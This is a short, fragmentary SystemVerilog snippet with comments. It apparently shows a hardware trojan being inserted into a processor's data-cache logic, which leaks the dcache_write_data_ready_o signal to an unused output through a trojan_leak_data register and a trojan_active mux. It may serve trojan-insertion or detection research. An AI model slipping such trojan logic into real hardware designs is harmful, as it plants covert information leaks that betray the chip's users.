 ...
 * Payload: Route dcache_write_data_ready_o to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= dcache_write_data_ready_o;
    end
end
...
// ============================================================
// Information Leak: Route dcache_write_data_ready_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? dcache_write_data_ready_o : normal_value;